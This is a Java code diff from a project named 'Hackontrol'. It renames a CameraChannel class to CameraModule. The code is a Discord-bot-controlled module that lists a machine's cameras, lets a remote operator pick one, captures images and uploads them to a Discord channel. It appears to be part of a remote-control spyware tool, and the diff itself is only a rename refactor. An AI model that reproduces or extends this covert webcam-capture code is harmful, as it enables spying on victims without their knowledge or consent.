@@ -1,10 +1,9 @@
-package com.khopan.hackontrol.channel;
+package com.khopan.hackontrol.module;
 
 import java.util.ArrayList;
 import java.util.List;
 
 import com.khopan.camera.Camera;
-import com.khopan.hackontrol.HackontrolChannel;
 import com.khopan.hackontrol.manager.interaction.ButtonContext;
 import com.khopan.hackontrol.manager.interaction.ButtonManager;
 import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
@@ -28,8 +27,8 @@ import net.dv8tion.jda.api.interactions.modals.Modal;
 import net.dv8tion.jda.api.interactions.modals.ModalMapping;
 import net.dv8tion.jda.api.utils.messages.MessageCreateBuilder;
 
-public class CameraChannel extends HackontrolChannel {
-	private static final String CHANNEL_NAME = "camera";
+public class CameraModule extends Module {
+	private static final String MODULE_NAME = "camera";
 
 	private static final Button BUTTON_CAMERA_LIST = ButtonManager.staticButton(ButtonType.SUCCESS, "Camera List", "cameraList");
 	private static final Button BUTTON_SELECT      = ButtonManager.staticButton(ButtonType.SUCCESS, "Select",      "selectCamera");
@@ -44,21 +43,21 @@ public class CameraChannel extends HackontrolChannel {
 
 	@Override
 	public String getName() {
-		return CameraChannel.CHANNEL_NAME;
+		return CameraModule.MODULE_NAME;
 	}
 
 	@Override
 	public void preInitialize(Registry registry) {
-		registry.register(InteractionManager.BUTTON_REGISTRY, CameraChannel.BUTTON_CAMERA_LIST,  this :: buttonCameraList);
-		registry.register(InteractionManager.BUTTON_REGISTRY, CameraChannel.BUTTON_SELECT,       this :: buttonSelect);
-		registry.register(InteractionManager.BUTTON_REGISTRY, CameraChannel.BUTTON_CAPTURE,      this :: buttonCapture);
-		registry.register(InteractionManager.BUTTON_REGISTRY, CameraChannel.BUTTON_REFRESH,      this :: buttonRefresh);
-		registry.register(InteractionManager.MODAL_REGISTRY,  CameraChannel.MODAL_SELECT_CAMERA, this :: modalSelectCamera);
+		registry.register(InteractionManager.BUTTON_REGISTRY, CameraModule.BUTTON_CAMERA_LIST,  this :: buttonCameraList);
+		registry.register(InteractionManager.BUTTON_REGISTRY, CameraModule.BUTTON_SELECT,       this :: buttonSelect);
+		registry.register(InteractionManager.BUTTON_REGISTRY, CameraModule.BUTTON_CAPTURE,      this :: buttonCapture);
+		registry.register(InteractionManager.BUTTON_REGISTRY, CameraModule.BUTTON_REFRESH,      this :: buttonRefresh);
+		registry.register(InteractionManager.MODAL_REGISTRY,  CameraModule.MODAL_SELECT_CAMERA, this :: modalSelectCamera);
 	}
 
 	@Override
 	public void initialize() {
-		this.channel.sendMessageComponents(ActionRow.of(CameraChannel.BUTTON_CAMERA_LIST)).queue();
+		this.channel.sendMessageComponents(ActionRow.of(CameraModule.BUTTON_CAMERA_LIST)).queue();
 	}
 
 	private void buttonCameraList(ButtonContext context) {
@@ -101,7 +100,7 @@ public class CameraChannel extends HackontrolChannel {
 				.setPlaceholder("1 - " + this.cameraList.length)
 				.build();
 
-		Modal modal = Modal.create(CameraChannel.MODAL_SELECT_CAMERA, "Select Camera")
+		Modal modal = Modal.create(CameraModule.MODAL_SELECT_CAMERA, "Select Camera")
 				.addActionRow(textInput)
 				.build();
 
@@ -118,8 +117,8 @@ public class CameraChannel extends HackontrolChannel {
 		TimeSafeReplyHandler.start(context, consumer -> {
 			try {
 				MessageCreateBuilder builder = new MessageCreateBuilder();
-				builder.setFiles(ScreenshotChannel.uploadImage(this.selectedCamera.capture(), "capture"));
-				builder.addActionRow(CameraChannel.BUTTON_CAPTURE, HackontrolButton.delete());
+				builder.setFiles(ScreenshotModule.uploadImage(this.selectedCamera.capture(), "capture"));
+				builder.addActionRow(CameraModule.BUTTON_CAPTURE, HackontrolButton.delete());
 				consumer.accept(builder.build());
 			} catch(Throwable Errors) {
 				HackontrolError.throwable(ConsumerMessageCreateDataSendable.of(consumer), Errors);
@@ -202,11 +201,11 @@ public class CameraChannel extends HackontrolChannel {
 		}
 
 		List<ItemComponent> list = new ArrayList<>();
-		list.add(CameraChannel.BUTTON_SELECT);
-		list.add(CameraChannel.BUTTON_REFRESH);
+		list.add(CameraModule.BUTTON_SELECT);
+		list.add(CameraModule.BUTTON_REFRESH);
 
 		if(hasSelected) {
-			list.add(CameraChannel.BUTTON_CAPTURE);
+			list.add(CameraModule.BUTTON_CAPTURE);
 		}
 
 		list.add(HackontrolButton.delete());
